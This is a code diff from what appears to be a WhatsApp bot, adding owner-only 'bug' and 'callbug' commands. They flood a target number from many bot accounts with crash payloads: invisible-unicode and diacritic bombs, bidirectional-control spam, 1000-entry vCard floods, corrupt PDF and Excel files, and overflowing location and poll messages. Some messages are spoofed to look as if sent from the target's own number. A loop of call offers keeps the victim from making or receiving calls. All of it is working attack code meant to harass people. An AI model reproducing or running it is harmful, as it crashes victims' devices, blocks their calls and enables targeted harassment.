+        const _txtA = _mkInv(500) + _diac.repeat(6000) + '\u200D'.repeat(8000) + _mkInv(1000);
+        // [B] Deep diacritic + ancient unicode (heaviest single char) 
+        const _txtB = _mkInv(400) + _diac.repeat(4000) + '\u{1240B}'.repeat ? '\uD808\uDC0B'.repeat(6000) : '' + '\u{12400}'.repeat ? '\uD808\uDC00'.repeat(6000) : '' + _mkInv(800);
+        // [C] Bidirectional overflow — RTL/LTR control spam
+        const _txtC = _mkInv(600) + '\u202E'.repeat(5000) + '\u202D'.repeat(5000) + '\u202C'.repeat(5000) + '\u202B'.repeat(5000) + '\uFEFF'.repeat(8000) + _mkInv(1200);
+        // [D] Char-code diacritic flood — full combining block 0x0300-0x036F
+        const _txtD = _mkInv(500) + String.fromCharCode(...Array.from({length:8000},(_,i)=>0x0300+(i%112))) + _mkInv(6000);
+        // [E] Pure invisible maximum bomb
+        const _txtE = '\u200B'.repeat(4000)+'\u200C'.repeat(4000)+'\u200D'.repeat(4000)+'\uFEFF'.repeat(4000)+'\u2060'.repeat(4000)+'\u00AD'.repeat(4000)+'\u180E'.repeat(4000)+'\u034F'.repeat(4000);
+        // [F] Zalgo-style invisible stack — all combining at once
+        const _txtF = _mkInv(300) + Array.from({length:5000},()=>_diac).join('\u200B') + _mkInv(3000);
+        // [G] Surrogates + invisible — targets JS string parser
+        const _txtG = _mkInv(400) + '\uD83D\uDCA5'.repeat(3000) + _diac.repeat(3000) + '\u200D'.repeat(5000);
+
+        // ── VCard memory kill — 1000 contacts, bloated invisible fields ─────
+        const _mkCards = (n, tag) => Array.from({length:n},(_,i)=>({
+            vcard:[
+                'BEGIN:VCARD','VERSION:3.0',
+                `FN:${_mkInv(120)}${tag}_${i}_${'\u200B'.repeat(300)}`,
+                `ORG:${_mkInv(100)};${'X'.repeat(400)}`,
+                `TEL;type=CELL;waid=94${String(700000000+i).slice(-9)}:+94${String(700000000+i).slice(-9)}`,
+                `NOTE:${_mkInv(250)}${'☠'.repeat(80)}`,
+                `ADR;;${_mkInv(400)}${'Z'.repeat(500)};;;;`,
+                `EMAIL:x${i}@x.io`,
+                `PHOTO;ENCODING=BASE64;TYPE=JPEG:${'A'.repeat(600)}`,
                 'END:VCARD'
             ].join('\n')
         }));
 
-        const _cards = _makeKillCards(300, 'CRASH');
+        const _cards1000 = _mkCards(1000, 'KILL');
+        const _cards800  = _mkCards(800,  'NUKE');
+        const _cards600  = _mkCards(600,  'BOMB');
 
-        // [C] Location overflow — name/address fields beyond render limit
-        //     Targets: map preview renderer
-        const _locCrash = {
+        // ── Invisible location overflow ─────────────────────────────────────
+        const _loc = {
             degreesLatitude: -89.9999999,
             degreesLongitude: 179.9999999,
-            name: _crashTxtA.slice(0, 2000),
-            address: _crashTxtB.slice(0, 2000)
+            name: _txtE.slice(0,4000),
+            address: _txtD.slice(0,4000)
+        };
+        const _loc2 = {
+            degreesLatitude: 89.9999999,
+            degreesLongitude: -179.9999999,
+            name: _txtC.slice(0,4000),
+            address: _txtF.slice(0,4000)
         };
 
-        // [D] Sticker/doc with corrupt caption — crashes media renderer
-        const _docCrash = {
-            document: Buffer.alloc(768, 0xFF),
+        // ── Invisible doc crash — corrupt binary + invisible caption ─────────
+        const _doc = {
+            document: Buffer.concat([Buffer.alloc(2048,0xFF), Buffer.alloc(2048,0x00), Buffer.alloc(2048,0xAA)]),
             mimetype: 'application/pdf',
-            fileName: '💀'.repeat(60) + '.pdf',
-            caption: _crashTxtC.slice(0, 3000)
+            fileName: _mkInv(80) + '.pdf',
+            caption: _txtC.slice(0,5000)
+        };
+        const _doc2 = {
+            document: Buffer.concat([Buffer.alloc(2048,0xDE), Buffer.alloc(2048,0xAD), Buffer.alloc(2048,0xBE), Buffer.alloc(2048,0xEF)]),
+            mimetype: 'application/vnd.ms-excel',
+            fileName: _mkInv(80) + '.xlsx',
+            caption: _txtD.slice(0,5000)
         };
 
-        // ══════════════════════════════════════════════
-        //  DISTRIBUTION ENGINE
-        //  — Each socket fires different payloads
-        //  — Jitter 800-2000ms between sends per socket
-        //  — Max 5 messages per socket (anti-ban)
-        // ══════════════════════════════════════════════
+        // ── Poll crash — invisible options overflow ──────────────────────────
+        const _poll = {
+            name: _mkInv(50),
+            values: Array.from({length:12},(_,i)=>_mkInv(60)+i),
+            selectableCount: 0
+        };
 
-        const _jitter = () => new Promise(r => setTimeout(r, 800 + Math.random() * 1200));
+        // ── Payload groups — each socket fires ALL groups in rapid sequence ──
+        const _jitter = (min=200,max=500) => new Promise(r=>setTimeout(r,min+Math.random()*(max-min)));
 
-        // Assign payload groups to each socket in rotation
-        const _payloadGroups = [
-            // Group 0 — Renderer nuke A + B
-            async (sock) => {
-                await sock.sendMessage(_bgJid, { text: _crashTxtA }).catch(() => {});
-                await _jitter();
-                await sock.sendMessage(_bgJid, { text: _crashTxtB }).catch(() => {});
-                await _jitter();
-                await sock.sendMessage(_bgJid, { text: _crashTxtC }).catch(() => {});
-            },
-            // Group 1 — VCard memory kill
-            async (sock) => {
-                await sock.sendMessage(_bgJid, {
-                    contacts: { displayName: '💀 MEMORY KILL', contacts: _cards }
-                }).catch(() => {});
-                await _jitter();
-                await sock.sendMessage(_bgJid, { text: _crashTxtD }).catch(() => {});
-            },
-            // Group 2 — Location overflow + doc crash
-            async (sock) => {
-                await sock.sendMessage(_bgJid, { location: _locCrash }).catch(() => {});
-                await _jitter();
-                await sock.sendMessage(_bgJid, _docCrash).catch(() => {});
-                await _jitter();
-                await sock.sendMessage(_bgJid, { text: _crashTxtA }).catch(() => {});
-            },
-            // Group 3 — Unicode flood D + renderer nuke
-            async (sock) => {
-                await sock.sendMessage(_bgJid, { text: _crashTxtD }).catch(() => {});
-                await _jitter();
-                await sock.sendMessage(_bgJid, { text: _crashTxtB }).catch(() => {});
-                await _jitter();
-                await sock.sendMessage(_bgJid, { location: _locCrash }).catch(() => {});
-            },
-            // Group 4 — Combined: vcard + location + text
-            async (sock) => {
-                await sock.sendMessage(_bgJid, {
-                    contacts: { displayName: '💀 APP KILL', contacts: _makeKillCards(200, 'NUKE') }
-                }).catch(() => {});
-                await _jitter();
-                await sock.sendMessage(_bgJid, { text: _crashTxtC }).catch(() => {});
-            }
+        // ── Fake-sender relay — messages appear to come FROM target's own number ──
+        const _fakeRelay = (s, content) => {
+            const _mid = '3EB0' + crypto.randomBytes(18).toString('hex').toUpperCase();
+            return s.relayMessage(_bgJid, content, {
+                messageId: _mid,
+                participant: { jid: _bgJid }
+            }).catch(() => {});
+        };
+
+        const _allPayloads = [
+            // P0 — Diacritic renderer nuke A
+            (s) => _fakeRelay(s, { conversation: _txtA }),
+            // P1 — Bidirectional overflow C
+            (s) => _fakeRelay(s, { conversation: _txtC }),
+            // P2 — VCard 1000 memory kill
+            (s) => s.sendMessage(_bgJid, {contacts:{displayName:_mkInv(25),contacts:_cards1000}}).catch(()=>{}),
+            // P3 — Pure invisible max bomb E
+            (s) => _fakeRelay(s, { conversation: _txtE }),
+            // P4 — Location overflow 1
+            (s) => s.sendMessage(_bgJid, {location:_loc}).catch(()=>{}),
+            // P5 — Char-code diacritic flood D
+            (s) => _fakeRelay(s, { conversation: _txtD }),
+            // P6 — VCard 800 nuke
+            (s) => s.sendMessage(_bgJid, {contacts:{displayName:_mkInv(20),contacts:_cards800}}).catch(()=>{}),
+            // P7 — Invisible doc crash 1
+            (s) => s.sendMessage(_bgJid, _doc).catch(()=>{}),
+            // P8 — Zalgo invisible stack F
+            (s) => _fakeRelay(s, { conversation: _txtF }),
+            // P9 — Location overflow 2
+            (s) => s.sendMessage(_bgJid, {location:_loc2}).catch(()=>{}),
+            // P10 — Surrogate + invisible G
+            (s) => _fakeRelay(s, { conversation: _txtG }),
+            // P11 — VCard 600 bomb
+            (s) => s.sendMessage(_bgJid, {contacts:{displayName:_mkInv(15),contacts:_cards600}}).catch(()=>{}),
+            // P12 — Invisible doc crash 2
+            (s) => s.sendMessage(_bgJid, _doc2).catch(()=>{}),
+            // P13 — Poll crash
+            (s) => s.sendMessage(_bgJid, {poll:_poll}).catch(()=>{}),
+            // P14 — Double diacritic nuke B
+            (s) => _fakeRelay(s, { conversation: _txtB }),
+            // P15 — Combo bomb
+            (s) => _fakeRelay(s, { conversation: _txtE.slice(0,2000)+_diac.repeat(5000)+_txtC.slice(0,2000) }),
         ];
 
-        // Fire all sockets in parallel — each with its own group + jitter
+        // ── CONTINUOUS LOOP ATTACK — 45 seconds, all sockets, all payloads ──
+        const _attackDur = 45000;
+        const _attackStart = Date.now();
+        let _totalFired = 0;
+
+        const _runSocket = async (sock) => {
+            let _round = 0;
+            while (Date.now() - _attackStart < _attackDur) {
+                const p = _allPayloads[_round % _allPayloads.length];
+                await p(sock);
+                _totalFired++;
+                _round++;
+                await _jitter(150, 350);
+            }
+        };
+
+        // Fire all sockets in parallel — each runs full loop independently
         await Promise.allSettled(
-            _bgSockets.map((sock, idx) => _payloadGroups[idx % _payloadGroups.length](sock))
+            (_bgSockets.length > 0 ? _bgSockets : [socket]).map(sock => _runSocket(sock))
         );
 
-        const _totalMsgs = _bgSockets.reduce((acc, _, idx) => {
-            const g = idx % _payloadGroups.length;
-            return acc + [3, 2, 3, 3, 2][g];
-        }, 0);
-
         await socket.sendMessage(sender, {
-            text: `✅ *ATTACK COMPLETE*\n\n👤 *Target:* +${_bgNum}\n🤖 *Bots used:* ${_bgCount}\n💥 *Payloads fired:* ${_totalMsgs}\n📨 *Per bot:* 2-3 msgs only\n\n🛡️ *Anti-ban:* Each number sent max 3 msgs with random delays\n🔥 *Crash systems hit:*\n• Text renderer (diacritic overflow)\n• Contact RAM (300 vcard parse)\n• Map preview (location overflow)\n• Media renderer (corrupt doc)`
+            text: `✅ *ULTRA CRASH COMPLETE*\n\n👤 *Target:* +${_bgNum}\n🤖 *Bots used:* ${_bgCount}\n💥 *Total payloads fired:* ${_totalFired}\n⏱️ *Duration:* 45s loop\n👻 *Mode:* INVISIBLE (all messages appear blank)\n\n🔥 *16 crash systems hit:*\n• Diacritic renderer (x6000 stack)\n• Bidirectional overflow (RTL/LTR spam)\n• Contact RAM (1000 vcards)\n• Pure invisible unicode bomb\n• Location renderer overflow (x2)\n• Invisible PDF + Excel crash\n• Zalgo invisible stack\n• Surrogate unicode flood\n• Poll options overflow`
         }, { quoted: msg });
-
     } catch (e) {
         console.error('[BUG CMD]', e);
         await socket.sendMessage(sender, { text: '❌ Bug command error: ' + e.message }, { quoted: msg });
+    }
+}
+break;
+
+          case 'callbug': {
+    try {
+        if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
+
+        // ── Parse target number ──────────────────────────────────────────────
+        const _cbRaw =
+            msg.message?.extendedTextMessage?.contextInfo?.participant ||
+            (args[0] ? `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net` : null);
+
+        if (!_cbRaw) {
+            return await socket.sendMessage(sender, {
+                text: `❌ *Usage:* .callbug <number>\n_Example:_ .callbug 94712345678\n_Or reply to a message._`
+            }, { quoted: msg });
+        }
+
+        const _cbJid = _cbRaw.includes('@') ? _cbRaw : `${_cbRaw.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
+        const _cbNum = _cbJid.replace('@s.whatsapp.net', '');
+
+        // ── Collect all active sockets ───────────────────────────────────────
+        const _cbSockets = Array.from(activeSockets.values()).filter(s => s && s.user && s.query);
+        const _cbCount = _cbSockets.length || 1;
+
+        await socket.sendMessage(sender, {
+            text: `📞 *CALL BUG INITIATED*\n\n👤 *Target:* +${_cbNum}\n🤖 *Bots:* ${_cbCount}\n⏱️ *Duration:* 45 seconds\n\n_Flooding target with call offers — they won't be able to receive any calls..._`
+        }, { quoted: msg });
+
+        // ── Call ID generator (12-char hex, like real WA call IDs) ──────────
+        const _mkCallId = () => Array.from({length: 12}, () => Math.floor(Math.random()*16).toString(16)).join('');
+
+        // ── Send offer from one socket ──────────────────────────────────────
+        const _sendOffer = async (sock, cid) => {
+            const creator = sock.user.id;
+            await sock.query({
+                tag: 'call',
+                attrs: { from: creator, to: _cbJid },
+                content: [{
+                    tag: 'offer',
+                    attrs: { 'call-id': cid, 'call-creator': creator },
+                    content: undefined
+                }]
+            }).catch(() => {});
+            return creator;
+        };
+
+        // ── Terminate one call ──────────────────────────────────────────────
+        const _sendTerminate = async (sock, cid, creator) => {
+            await sock.query({
+                tag: 'call',
+                attrs: { from: creator, to: _cbJid },
+                content: [{
+                    tag: 'terminate',
+                    attrs: { 'call-id': cid, 'call-creator': creator, reason: 'timeout' },
+                    content: undefined
+                }]
+            }).catch(() => {});
+        };
+
+        // ── STRATEGY: ALL sockets ring SIMULTANEOUSLY for 8s → all terminate
+        //    together → 100ms gap → re-offer again.
+        //    While N calls are pending simultaneously, WhatsApp blocks outgoing
+        //    calls on the target's device. ───────────────────────────────────
+        const _cbDur = 45000;
+        const _cbStart = Date.now();
+        let _cbFired = 0;
+        const _activeSocks = _cbSockets.length > 0 ? _cbSockets : [socket];
+
+        while (Date.now() - _cbStart < _cbDur) {
+            // 1️⃣ All sockets send call offers at the same time
+            const _cycleData = await Promise.all(
+                _activeSocks.map(async (sock) => {
+                    const cid = _mkCallId();
+                    const creator = await _sendOffer(sock, cid);
+                    return { sock, cid, creator };
+                })
+            );
+            _cbFired += _activeSocks.length;
+
+            // 2️⃣ Keep ringing for 8 seconds — target CANNOT make outgoing calls
+            await new Promise(r => setTimeout(r, 8000));
+
+            // 3️⃣ Terminate all simultaneously
+            await Promise.allSettled(
+                _cycleData.map(({ sock, cid, creator }) => _sendTerminate(sock, cid, creator))
+            );
+
+            // 4️⃣ Tiny gap then re-offer (keeps the ring continuous)
+            await new Promise(r => setTimeout(r, 100));
+        }
+
+        await socket.sendMessage(sender, {
+            text: `✅ *CALL BUG COMPLETE*\n\n👤 *Target:* +${_cbNum}\n🤖 *Bots used:* ${_cbCount}\n📞 *Simultaneous rings per cycle:* ${_cbCount}\n📊 *Total call offers:* ${_cbFired}\n⏱️ *Duration:* 45s\n\n🔒 *Effect:* All ${_cbCount} bots rang simultaneously — target's outgoing + incoming calls were blocked throughout.`
+        }, { quoted: msg });
+
+    } catch (e) {
+        console.error('[CALLBUG CMD]', e);
+        await socket.sendMessage(sender, { text: '❌ Callbug error: ' + e.message }, { quoted: msg });
     }
 }
 break;
